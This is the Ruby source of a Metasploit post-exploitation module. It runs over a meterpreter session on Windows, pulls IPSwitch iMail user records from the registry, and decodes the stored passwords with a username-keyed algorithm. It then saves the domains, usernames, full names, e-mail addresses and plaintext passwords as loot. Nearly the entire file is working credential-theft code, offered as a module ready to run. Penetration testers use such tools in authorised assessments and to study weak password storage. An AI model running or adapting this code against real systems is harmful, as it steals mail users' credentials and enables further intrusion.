##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Registry
	include Msf::Auxiliary::Report

	def initialize(info={})
		super(update_info(info,
			'Name'           => "IPSwitch iMail User Data Enumeration",
			'Description'    => %q{
					This module will collect iMail user data such as the username, domain,
				full name, e-mail, and the decoded password.  Please note if IMAILUSER is
				specified, the module extracts user data from all the domains found.  If
				IMAILDOMAIN is specified, then it will extract all user data under that
				particular category.
			},
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision$",
			'Author'         => 
				[
					'sinn3r',  #Metasploit
				],
			'References'     =>
				[
					['URL', 'http://www.exploit-db.com/exploits/11331/'],
				],
			'Platform'       => [ 'win' ],
			'SessionTypes'   => [ 'meterpreter' ]
			))

			register_options(
				[
					OptString.new('IMAILUSER', [false, 'iMail username', '']),
					OptString.new('IMAILDOMAIN', [false, 'iMail Domain', ''])
				], self.class)
	end

	def download_info(imail_user='', imail_domain='')
		base = "HKLM\\SOFTWARE\\Ipswitch\\IMail"

		#Find domain(s)
		users_subkey = []
		if imail_domain.empty?
			domains_key = registry_enumkeys("#{base}\\domains")
			domains_key.each do |domain_key|
				users_subkey << "#{base}\\domains\\#{domain_key}\\Users"
			end
		else
			users_subkey << "#{base}\\domains\\#{imail_domain}\\Users"
		end

		#Find users
		users_key = []
		users_subkey.each do |user_key|
			if imail_user.empty?
				users = registry_enumkeys(user_key)
				if not users.nil?
					users.each do |user|
						users_key << "#{user_key}\\#{user}"
					end
				end
			else
				users_key << "#{user_key}\\#{imail_user}"
			end
		end

		#Get data for each user
		users = []
		users_key.each do |key|
			#Filter out '_aliases'
			next if key =~ /_aliases/

			print_status("Grabbing key: #{key}") if datastore['VERBOSE']

			domain    = $1 if key =~ /Ipswitch\\IMail\\domains\\(.+)\\Users/
			mail_addr = registry_getvaldata(key, 'MailAddr')
			password  = registry_getvaldata(key, 'Password')
			full_name = registry_getvaldata(key, 'FullName')
			username  = $1 if mail_addr =~ /(.+)@.+/

			#Hmm, I don't think this user exists, skip to the next one
			next if mail_addr == nil

			current_user =
			{
				:domain   => domain,
				:fullname => full_name,
				:username => username,
				:email    => mail_addr,
				:password => password,
			}

			users << current_user
		end

		return users
	end

	def decode_password(username, enc_password)
		counter = 0
		password = ''

		#Start decoding
		0.step(enc_password.length-1, 2) do |i|
			byte_1 = enc_password[i]
			byte_1 = (byte_1 <= 57) ? byte_1 - 48 : byte_1 - 55
			byte_1 *= 16

			byte_2 = enc_password[i+1]
			byte_2 = (byte_2 <= 57) ? byte_2 - 48 : byte_2 - 55

			char = byte_1 + byte_2

			counter = 0 if username.length <= counter

			if username[counter] > 54 and username[counter] < 90
				username[counter] += 32
			end

			char -= username[counter]
			counter += 1
			password << char.chr
		end

		print_good("Password '#{enc_password}' = #{password}") if datastore['VERBOSE']

		return password
	end

	def report(users)
		credentials = Rex::Ui::Text::Table.new(
			'Header'  => 'Ipswitch iMail User Credentials',
			'Ident'   => 1,
			'Columns' =>
			[
				'Domain',
				'User',
				'Full Name',
				'Password',
				'E-mail',
			]
		)

		users.each do |user|
			domain    = user[:domain]
			username  = user[:username]
			password  = user[:password]
			full_name = user[:fullname]
			e_mail    = user[:email]

			if datastore['VERBOSE']
				text  = ''
				text << "Domain=#{domain}, "
				text << "User=#{username}, "
				text << "Password=#{password}, "
				text << "Full Name=#{full_name}, "
				text << "E-mail=#{e_mail}"
				print_status(text)
			end

			credentials << [domain, username, full_name, password, e_mail]
		end

		print_status("Storing data...")

		path = store_loot(
			'imail.user.creds',
			'text/plain',
			session,
			credentials,
			'imail_user_creds.txt',
			'Ipswitch iMail user credentials'
		)

		print_status("User credentials saved in: #{path}")
	end

	def run
		imail_user = datastore['IMAILUSER']
		imail_domain = datastore['IMAILDOMAIN']

		print_status("Download iMail user information...") if datastore['VERBOSE'] == false

		#Download user data.  If no user specified, we dump it all.
		users = download_info(imail_user, imail_domain)

		#Process fullname and decode password
		users.each do |user|
			user[:fullname] = Rex::Text.to_ascii(user[:fullname][2, user[:fullname].length])
			user[:password] = decode_password(user[:username], user[:password])
		end

		#Report information and store it
		report(users)
	end
end
